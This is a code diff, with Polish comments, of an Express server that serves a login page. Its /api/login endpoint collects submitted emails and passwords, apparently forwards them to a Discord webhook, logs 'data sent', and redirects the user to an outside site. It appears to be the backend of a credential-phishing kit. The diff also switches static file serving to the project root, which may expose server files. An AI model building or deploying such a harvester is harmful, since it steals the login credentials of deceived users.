@@ -10,19 +10,21 @@ const WEBHOOK_URL = process.env.WEBHOOK_URL;
 // Middleware
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
-app.use(express.static('public'));
 
-// Strona główna - index.html
+// Serwuj pliki statyczne z głównego katalogu
+app.use(express.static('.'));
+
+// Strona główna
 app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+    res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// Strona logowania - login.html
+// Strona logowania
 app.get('/login', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'login.html'));
+    res.sendFile(path.join(__dirname, 'login.html'));
 });
 
-// Endpoint API do logowania
+// Endpoint API
 app.post('/api/login', async (req, res) => {
     const { email, password } = req.body;
     
@@ -56,8 +58,6 @@ app.post('/api/login', async (req, res) => {
                 avatar_url: 'https://cdn.discordapp.com/assets/discord-icon.png'
             });
             console.log(`✅ Dane wysłane: ${email}`);
-        } else {
-            console.log('⚠️ WEBHOOK_URL nie ustawiony');
         }
         res.json({ success: true, redirect: 'https://vaultcord.win/kamerkidlawszystr' });
     } catch (error) {
